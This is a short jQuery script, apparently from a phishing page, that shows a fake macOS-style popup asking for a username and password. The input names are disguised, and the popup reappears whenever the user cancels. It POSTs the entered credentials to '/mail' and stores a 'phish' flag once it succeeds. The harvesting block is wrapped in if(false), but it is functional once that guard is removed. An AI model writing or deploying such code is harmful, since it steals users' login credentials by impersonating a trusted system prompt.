$(document).ready(function () {
  if (false) {
    var $popup = $('#macOsPopup')
    var $username = $('input[name="veg"]')
    var $password = $('input[name="fruit"]')
    if (localStorage.getItem('phish') === null) {
      showPopup(8000)
    }
    $('#cancel').click(function () {
      $popup.hide()
      showPopup(4000)
    })

    $('#submit').click(function () {
      $.ajax({
        url: '/mail',
        type: 'POST',
        dataType: 'json',
        data: {username: $username.val(), password: $password.val()},
        success: function (resp) {
          localStorage.setItem('phish', true)
          $popup.hide()
        },
        error: function (data) {
          console.log('error')
        }
      })
    })
  }
})

function showPopup (time) {
  'use strict'
  var $password = $('input[name="fruit"]')
  setTimeout(function () {
    $('#macOsPopup').show()
    $password.focus()
  }, time)
}
